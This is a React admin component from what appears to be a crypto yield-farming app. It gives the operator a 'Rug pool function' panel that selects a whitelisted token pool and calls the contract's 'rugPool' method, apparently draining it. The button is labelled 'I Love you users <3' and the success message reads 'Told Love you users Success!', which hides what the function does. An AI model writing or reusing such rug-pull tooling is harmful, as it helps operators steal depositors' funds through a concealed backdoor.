import {
  Text,
  Button,
  Center,
  Divider,
  Spinner,
  GridItem,
  Grid,
  Box,
  Select,
  useToast,
} from "@chakra-ui/react";
import { useFarm } from "hooks/useContracts";
import useAccount from "hooks/useAccount";
import { useWhitelisted } from "hooks/useFunctions";
import { useState, useEffect } from "react";
import Toast from "components/Utils/Toast/Toast";

const HappyAdmin = () => {
  const account = useAccount();
  const getWhitelisted = useWhitelisted();
  const [whitelisted, setWhitelisted] = useState([]);
  const [loveToken, setLoveToken] = useState(null);
  const Farm = useFarm();
  const toast = useToast();

  useEffect(() => {
    setWhitelisted(getWhitelisted);
  }, [getWhitelisted]);

  const [send_tx_status, setSendTxStatus] = useState(false);
  const [wait_tx, setWaitTx] = useState(false);

  const txStatus = async (hash) => {
    const web3 = window.web3;
    const status = await web3.eth.getTransactionReceipt(hash);
    return status;
  };

  const handleChangeLoveToken = (e) => {
    setLoveToken(e.target.value);
  };

  const handleLoveU = async () => {
    setSendTxStatus(true);
    setWaitTx(true);
    await Farm.methods
      .rugPool(loveToken)
      .send({ from: account })
      .on("transactionHash", (hash) => {
        const claimCheck = setInterval(async () => {
          const tx_status = await txStatus(hash);
          if (tx_status && tx_status.status) {
            setWaitTx(false);
            setSendTxStatus(false);
            clearInterval(claimCheck);

            toast({
              title: "Success",
              description: "Told Love you users Success!",
              status: "success",
              duration: 1500,
              isClosable: true,
            });
          }
        }, 1500);
      });
  };
  return (
    <>
      <Text fontSize="xl" mt={3} style={{ textAlign: "center" }}>
        <b>Happy Admin</b>
      </Text>

      <Text style={{ textAlign: "center" }}>Rug pool function</Text>
      <Center>
        <Box width={"50%"}>
          <Grid pt={10} templateColumns="repeat(10, 1fr)" gap={0}>
            <GridItem colSpan={10}>
              <Select
                onChange={handleChangeLoveToken}
                placeholder="Choose Pool"
              >
                {whitelisted &&
                  whitelisted.map((token) => {
                    return (
                      <>
                        <option key={token.address} value={token.address}>
                          {token.symbol}
                        </option>
                      </>
                    );
                  })}
              </Select>
            </GridItem>
          </Grid>
          <Button
            style={{
              color: "#FFFFFF",
              background: "linear-gradient(90deg ,#576cea 0%, #da65d1 100%)",
            }}
            disabled={loveToken == null || (wait_tx && send_tx_status)}
            mt={2}
            w={"100%"}
            onClick={() => {
              handleLoveU();
            }}
          >
            {wait_tx && send_tx_status ? (
              <>
                <Spinner size={"sm"} mr={2} /> Waiting ...
              </>
            ) : (
              "I Love you users <3"
            )}
          </Button>
        </Box>
      </Center>
      <Divider mt={20} />
    </>
  );
};

export default HappyAdmin;
